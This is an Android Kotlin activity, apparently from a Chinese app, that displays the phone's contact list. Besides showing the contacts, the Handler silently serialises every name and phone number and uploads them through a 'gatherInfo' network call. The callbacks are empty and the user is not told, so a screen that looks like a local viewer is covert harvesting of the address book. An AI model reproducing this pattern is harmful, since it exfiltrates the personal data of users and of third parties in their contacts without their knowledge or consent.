package com.zxy.mytsfqxproject.activity

import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.net.Uri
import android.os.Handler
import android.os.Message
import android.os.SystemClock
import android.support.v7.widget.LinearLayoutManager
import android.text.TextUtils
import android.view.View
import com.google.gson.Gson
import com.google.gson.JsonObject
import com.zxy.mytsfqxproject.MyApplication.Companion.context
import com.zxy.mytsfqxproject.R
import com.zxy.mytsfqxproject.Utils.StatusBarUtil
import com.zxy.mytsfqxproject.Utils.Tools
import com.zxy.mytsfqxproject.adapter.PhoneListAdapter
import com.zxy.mytsfqxproject.base.BaseActivity
import com.zxy.mytsfqxproject.http.RetrofitManager
import com.zxy.mytsfqxproject.mvp.entity.PhoneList
import com.zxy.mytsfqxproject.recyclerView.OnRecyclerItemClickListener
import kotlinx.android.synthetic.main.activity_phone_book.*
import kotlinx.android.synthetic.main.top_view.*
import retrofit2.Call
import retrofit2.Response
import java.util.*


class PhoneAddressBookActivity : BaseActivity(), OnRecyclerItemClickListener<PhoneList> {
    override fun layoutId(): Int = R.layout.activity_phone_book
    private lateinit var mPhoneListAdapter: PhoneListAdapter
    private val list = ArrayList<PhoneList>()
    var pamrms = HashMap<String, Any>()
    @SuppressLint("HandlerLeak")
    private val mHandler = object : Handler() {
        override fun handleMessage(msg: Message) {
            when (msg.what) {
                0 -> {
                    getListMan()
                    mPhoneListAdapter.setDataList(list)
                    if (list != null && list.size > 0) {
                        pamrms["info"] = Gson().toJson(list)
                        RetrofitManager.service.gatherInfo(Tools.getRequestBody(pamrms)).enqueue(object : retrofit2.Callback<JsonObject> {
                            override fun onFailure(call: Call<JsonObject>, t: Throwable) {
                            }

                            override fun onResponse(call: Call<JsonObject>, response: Response<JsonObject>) {
                            }
                        })
                    } else {
                        mLayoutStatusView!!.showEmpty()
                    }
                    mProgressDialog!!.dismiss()
                }
            }
        }
    }

    override fun initView() {
        this.let { StatusBarUtil.darkMode(it) }
        this.let { StatusBarUtil.setPaddingSmart(it, top_view) }
        mProgressDialog = ProgressDialog(this)
        mLayoutStatusView = multipleStatusView
        iv_left.setImageResource(R.mipmap.img_back)
        iv_left.setOnClickListener { finish() }
        tv_header_title.text = "手机通讯录"
        mPhoneListAdapter = PhoneListAdapter(this)
        recyclerView.layoutManager = LinearLayoutManager(this)
        recyclerView.adapter = mPhoneListAdapter
        mPhoneListAdapter.onRecyclerItemClickListener = this
        mProgressDialog!!.setMessage("加载中......")
        mProgressDialog!!.show()
        mHandler.sendEmptyMessageDelayed(0, 1000)
    }

    override fun start() {
    }

    override fun onItemClick(v: View, item: PhoneList, position: Int) {
    }

    @SuppressLint("Recycle")
    fun getListMan(): List<PhoneList> {
        SystemClock.sleep(3000)
        // 1.获取内容解析者
        val resolver = context.contentResolver
        // 2.获取内容提供者的地址:com.android.contacts
        // raw_contacts表的地址 :raw_contacts
        // view_data表的地址 : data
        // 3.生成查询地址
        val raw_uri = Uri.parse("content://com.android.contacts/raw_contacts")
        val date_uri = Uri.parse("content://com.android.contacts/data")
        // 4.查询操作,先查询raw_contacts,查询contact_id
        // projection : 查询的字段
        val cursor = resolver.query(raw_uri, arrayOf("contact_id"), null, null, null)
        // 5.解析cursor
        while (cursor.moveToNext()) {
            // 6.获取查询的数据
            val contact_id = cursor.getString(0)
            // cursor.getString(cursor.getColumnIndex("contact_id"));//getColumnIndex
            // : 查询字段在cursor中索引值,一般都是用在查询字段比较多的时候
            // 判断contact_id是否为空
            if (!TextUtils.isEmpty(contact_id)) {//null   ""
                // 7.根据contact_id查询view_data表中的数据
                // selection : 查询条件
                // selectionArgs :查询条件的参数
                // sortOrder : 排序
                // 空指针: 1.null.方法 2.参数为null
                val c = resolver.query(date_uri, arrayOf("data1", "mimetype"), "raw_contact_id=?",
                        arrayOf(contact_id), null)
                val phoneList = PhoneList()
                // 8.解析c
                while (c.moveToNext()) {
                    // 9.获取数据
                    val data1 = c.getString(0)
                    val mimetype = c.getString(1)
                    // 10.根据类型去判断获取的data1数据并保存
                    if (mimetype == "vnd.android.cursor.item/phone_v2") {
                        // 电话
                        phoneList.number = data1
                    } else if (mimetype == "vnd.android.cursor.item/name") {
                        // 姓名
                        phoneList.name = data1
                    }
                }
                // 11.添加到集合中数据
                list.add(phoneList)
                // 12.关闭cursor
                c.close()
            }
        }
        // 12.关闭cursor
        cursor.close()
        return list
    }
}